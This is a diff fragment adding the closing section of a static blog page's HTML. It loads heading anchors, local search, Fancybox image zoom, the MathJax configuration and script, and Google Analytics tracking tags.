+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
